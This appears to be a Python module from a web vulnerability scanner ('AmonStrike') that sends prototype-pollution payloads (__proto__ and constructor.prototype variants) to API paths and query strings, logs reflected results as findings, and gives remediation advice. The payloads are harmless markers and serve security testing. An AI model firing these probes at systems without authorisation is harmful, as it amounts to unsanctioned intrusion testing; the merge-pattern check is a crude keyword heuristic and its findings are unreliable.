"""AmonStrike - Prototype Pollution Module"""
import re, json
from .base import BaseModule

PP_PAYLOADS = [
    {"__proto__": {"polluted": "yes"}},
    {"constructor": {"prototype": {"polluted": "yes"}}},
    {"__proto__[polluted]": "yes"},
    {"__proto__.polluted": "yes"},
]

PP_PARAMS = ["data","json","body","params","options","config","settings","user","payload"]

class PrototypePollutionModule(BaseModule):
    NAME        = "prototype_pollution"
    DESCRIPTION = "Prototype pollution - __proto__, constructor.prototype, JSON merge"

    def run(self):
        self.log("Testing prototype pollution...")
        self._test_json_endpoints()
        self._test_query_params()
        self._test_merge_patterns()
        self.log(f"Prototype pollution complete - {len(self.findings)} findings", "+")
        return self.result()

    def _test_json_endpoints(self):
        api_paths = ["/api/", "/api/v1/", "/api/settings", "/api/config", "/api/merge"]
        for path in api_paths:
            r = self.get(path)
            if not r or r.status_code == 404: continue
            for payload in PP_PAYLOADS[:2]:
                r2 = self.post(path, json=payload)
                if r2 and r2.status_code in [200, 201]:
                    resp_text = r2.text
                    if "polluted" in resp_text:
                        self.add_finding(
                            title       = f"Prototype Pollution Confirmed at {path}",
                            severity    = "HIGH",
                            description = (
                                f"Prototype pollution via __proto__ at {path}. "
                                "Injected property 'polluted' reflected in response. "
                                "Can lead to XSS, DoS, or privilege escalation depending on server."
                            ),
                            evidence    = (
                                f"Path: {path}\n"
                                f"Payload: {json.dumps(payload)}\n"
                                f"'polluted' in response: YES\n"
                                f"Response: {resp_text[:300]}"
                            ),
                            remediation = (
                                "Use Object.create(null) for merge targets. "
                                "Freeze Object.prototype. "
                                "Validate/sanitize keys before merge (reject __proto__, constructor)."
                            ),
                            url=self.url+path, parameter="__proto__",
                            payload=json.dumps(payload), cve="CWE-1321",
                        )
                        break

    def _test_query_params(self):
        """Test prototype pollution via URL query params."""
        test_urls = [
            f"{self.url}?__proto__[polluted]=yes",
            f"{self.url}?constructor[prototype][polluted]=yes",
            f"{self.url}?__proto__.polluted=yes",
        ]
        for url in test_urls:
            r = self.session.get(url, timeout=self.timeout, verify=False)
            if r and "polluted" in r.text:
                self.add_finding(
                    title       = "Prototype Pollution via Query Parameter",
                    severity    = "HIGH",
                    description = "__proto__ in query string pollutes object prototype.",
                    evidence    = f"URL: {url}\n'polluted' reflected in response",
                    remediation = "Strip __proto__ and constructor keys from query string parsing.",
                    url=url, parameter="__proto__", payload="__proto__[polluted]=yes", cve="CWE-1321",
                )
                break

    def _test_merge_patterns(self):
        """Check for vulnerable merge patterns in response structure."""
        r = self.get("")
        if not r: return
        # Look for JSON responses with nested merge patterns
        try:
            data = r.json()
            if isinstance(data, dict):
                suspicious = any(k in str(data) for k in ["merge","extend","assign","clone","deepcopy"])
                if suspicious:
                    self.add_finding(
                        title       = "Potential Prototype Pollution - Merge Pattern Detected",
                        severity    = "MEDIUM",
                        description = "API response contains merge/extend patterns - manual prototype pollution testing recommended.",
                        evidence    = f"Response keys hint at merge operations: {list(data.keys())[:10]}",
                        remediation = "Audit all object merge/extend operations. Use safe merge libraries.",
                        url=self.url, cve="CWE-1321",
                    )
        except Exception:
            pass
